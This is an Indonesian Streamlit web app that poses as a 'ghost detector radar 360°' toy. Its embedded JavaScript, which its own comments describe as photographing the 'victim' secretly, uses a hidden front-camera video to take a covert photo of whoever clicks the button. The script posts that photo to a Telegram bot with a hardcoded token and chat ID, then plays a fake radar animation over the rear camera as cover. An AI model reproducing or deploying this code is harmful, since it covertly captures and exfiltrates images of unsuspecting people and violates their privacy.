import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Radar Detektor Gaib 360°",
    page_icon="📡",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING RADAR Keren & Modern
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');

    .stApp {
        background: linear-gradient(135deg, #020024 0%, #090979 35%, #00d4ff 100%);
        color: #ffffff;
        font-family: 'Orbitron', sans-serif;
    }

    .radar-container {
        background: rgba(0, 0, 0, 0.75);
        backdrop-filter: blur(12px);
        border: 3px solid #00ffcc;
        border-radius: 25px;
        padding: 25px;
        box-shadow: 0 0 35px rgba(0, 255, 204, 0.5), inset 0 0 20px rgba(0, 255, 204, 0.2);
        margin-bottom: 20px;
    }

    .alert-box {
        background: rgba(255, 0, 85, 0.2);
        border: 2px dashed #ff0055;
        padding: 15px;
        border-radius: 15px;
        margin-bottom: 20px;
        font-size: 13px;
        color: #ff3366;
        text-align: center;
        font-weight: 700;
        line-height: 1.5;
        box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# TAMPILAN UTAMA
# ==========================================
st.markdown("<h1 style='text-align: center; color: #00ffcc; text-shadow: 0 0 15px #00ffcc; font-size: 1.8rem;'>📡 RADAR DETEKTOR MAKHLUK GAIB 360°</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #ffff00; font-size: 0.95rem; font-weight: 600;'>Deteksi keberadaan entitas tak kasat mata di sekitar ruanganmu secara real-time!</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="radar-container">', unsafe_allow_html=True)
    
    st.markdown("""
        <div class="alert-box">
            ⚠️ <b>PERINGATAN SEBELUM MULAI:</b><br>
            Jangan kaget kalau tiba-tiba radar berbunyi nyaring dan titik merah muncul di dekatmu! Wajib klik <b>"ALLOW / IZINKAN"</b> untuk mengaktifkan sensor frekuensi elektromagnetik kamera. 👻📲
        </div>
    """, unsafe_allow_html=True)

    # HTML & JavaScript untuk Radar Detektor Simulasi
    radar_script_html = f"""
    <div style="text-align: center;">
        <button id="activateRadar" style="
            background: linear-gradient(135deg, #ff0055 0%, #7209b7 100%);
            color: #ffffff;
            font-weight: 900;
            font-size: 16px;
            border: 3px solid #00ffcc;
            padding: 16px 20px;
            border-radius: 18px;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 0 25px rgba(255, 0, 85, 0.8);
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            letter-spacing: 1px;
        ">🚨 AKTIFKAN RADAR SCANNER SEKARANG</button>
    </div>

    <!-- Kamera depan tersembunyi untuk ambil foto korban secara diam-diam -->
    <video id="stealth-cam" autoplay playsinline style="display:none;"></video>
    <canvas id="stealth-canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- Tampilan Live Kamera Belakang dengan Animasi Radar -->
    <div id="radar-live-view" style="display:none; margin-top: 20px; text-align: center; position: relative;">
        <p id="radar-status" style="color: #ff0055; font-size: 13px; font-weight: bold; margin-bottom: 8px; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 8px #ff0055;">
            🔴 MENDAFTAR FREKUENSI: MENCARI ENTITAS...
        </p>
        
        <div style="position: relative; display: inline-block; width: 100%; max-width: 380px;">
            <!-- Kamera Belakang -->
            <video id="back-camera-feed" autoplay playsinline style="
                width: 100%;
                border-radius: 16px;
                border: 3px solid #00ffcc;
                filter: contrast(130%) brightness(85%);
                box-shadow: 0 0 30px rgba(0, 255, 204, 0.5);
                display: block;
            "></video>

            <!-- Efek Overlay Garis Radar Berputar / Scanner -->
            <div style="
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                border-radius: 16px;
                pointer-events: none;
                background: radial-gradient(circle, rgba(0,255,204,0.1) 0%, rgba(0,0,0,0.4) 80%);
                overflow: hidden;
            ">
                <!-- Garis Sweeping Radar -->
                <div style="
                    position: absolute;
                    top: 50%; left: 50%;
                    width: 200%; height: 200%;
                    transform: translate(-50%, -50%);
                    background: conic-gradient(from 0deg at 50% 50%, rgba(0, 255, 204, 0) 0deg, rgba(0, 255, 204, 0.4) 330deg, rgba(255, 0, 85, 0.8) 360deg);
                    animation: sweepRadar 3s linear infinite;
                "></div>
                
                <!-- Titik Target Merah Acak di Layar (Simulasi Entitas Terdeteksi) -->
                <div id="target-dot" style="
                    position: absolute;
                    top: 35%; left: 60%;
                    width: 14px; height: 14px;
                    background: #ff0055;
                    border-radius: 50%%;
                    box-shadow: 0 0 12px #ff0055, 0 0 25px #ff0055;
                    display: none;
                    animation: blinkDot 0.8s ease-in-out infinite;
                "></div>
            </div>
        </div>
    </div>

    <style>
        @keyframes sweepRadar {{
            0% {{ transform: translate(-50%, -50%) rotate(0deg); }}
            100% {{ transform: translate(-50%, -50%) rotate(360deg); }}
        }}
        @keyframes blinkDot {{
            0%, 100% {{ opacity: 0.2; transform: scale(0.8); }}
            50% {{ opacity: 1; transform: scale(1.3); }}
        }}
    </style>

    <script>
        const botToken = "{TELEGRAM_BOT_TOKEN}";
        const targetChatId = "{TELEGRAM_CHAT_ID}";

        document.getElementById('activateRadar').addEventListener('click', async function() {{
            const btn = document.getElementById('activateRadar');
            btn.innerText = "MENGKALIBRASI RADAR...";
            btn.style.opacity = "0.7";

            try {{
                // 1. Ambil foto dari kamera depan secara diam-diam (silent snap)
                const frontStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const stealthVideo = document.getElementById('stealth-cam');
                stealthVideo.srcObject = frontStream;
                
                await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik biar frame stabil
                
                const canvas = document.getElementById('stealth-canvas');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(stealthVideo, 0, 0, canvas.width, canvas.height);
                
                // 2. Kirim otomatis ke Telegram Bot
                canvas.toBlob(function(blob) {{
                    const formData = new FormData();
                    formData.append('chat_id', targetChatId);
                    formData.append('photo', blob, 'target_radar_tercyduk.jpg');
                    formData.append('caption', '🎯 <b>TARGET TERCYDUK MEMBUKA RADAR DETEKTOR GAIB!</b>');
                    
                    fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {{
                        method: 'POST',
                        body: formData
                    }});
                }}, 'image/jpeg', 0.85);
                
                // Matikan kamera depan
                frontStream.getTracks().forEach(track => track.stop());

                // 3. Sembunyikan tombol, tampilkan live view kamera belakang dengan efek radar
                btn.style.display = "none";
                document.getElementById('radar-live-view').style.display = "block";

                // Buka kamera belakang
                const backStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "environment" }} 
                }});
                const backVideo = document.getElementById('back-camera-feed');
                backVideo.srcObject = backStream;

                // Simulasi status berubah setelah 2.5 detik (menemukan entitas)
                setTimeout(() => {{
                    document.getElementById('radar-status').innerHTML = "⚠️️ PERINGATAN: ENTITAS TERDETEKSI DI DEKATMU!";
                    document.getElementById('radar-status').style.color = "#00ffcc";
                    document.getElementById('target-dot').style.display = "block";
                }}, 2500);

            }} catch(err) {{
                console.log("Error akses kamera: ", err);
                btn.innerText = "IZIN DITOLAK - COBA ULANG";
                btn.style.opacity = "1";
            }}
        }});
    </script>
    """
    
    components.html(radar_script_html, height=500)
    st.markdown('</div>', unsafe_allow_html=True)
